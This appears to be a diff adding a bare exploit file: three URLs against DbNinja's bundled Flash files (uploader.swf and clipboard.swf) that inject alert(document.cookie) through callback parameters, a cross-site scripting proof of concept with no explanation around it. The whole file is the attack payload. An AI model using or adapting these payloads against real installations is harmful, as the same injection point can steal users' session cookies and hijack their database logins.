@@ -1,0 +1,5 @@
+http://localhost/dbninja/dbninja/js/lib/uploader.swf?selectCallback=alert(document.cookie)
+
+2- http://localhost/dbninja/dbninja/js/lib/clipboard.swf?buttonText=DbNinja%20Login&dataSourceFunc=alert(document.cookie)
+
+3- http://localhost/dbninja/dbninja/js/lib/clipboard.swf?completeCallback=alert(document.cookie)
